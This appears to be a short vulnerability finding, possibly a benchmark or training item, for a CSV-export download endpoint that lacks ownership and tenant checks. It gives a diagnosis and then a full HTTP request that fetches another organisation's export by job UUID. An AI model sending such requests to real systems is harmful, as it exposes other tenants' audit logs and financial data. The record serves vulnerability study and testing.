diagnosis: DownloadAuditExportCSVView allows any authenticated user to download the generated CSV file of a BackgroundExportJob by export_job_id. The endpoint performs no ownership or tenant isolation checks, permitting attackers who obtain or guess an export job UUID to download complete audit logs, financial exports, or customer dumps created by other organizations.
exploit_request:
GET /api/audit-exports/3d517a94-81cc-4402-bb03-dc90e5178601/download/ HTTP/1.1
Host: reporting.enterprise.io
Authorization: Bearer outsider_jwt
Accept: text/csv
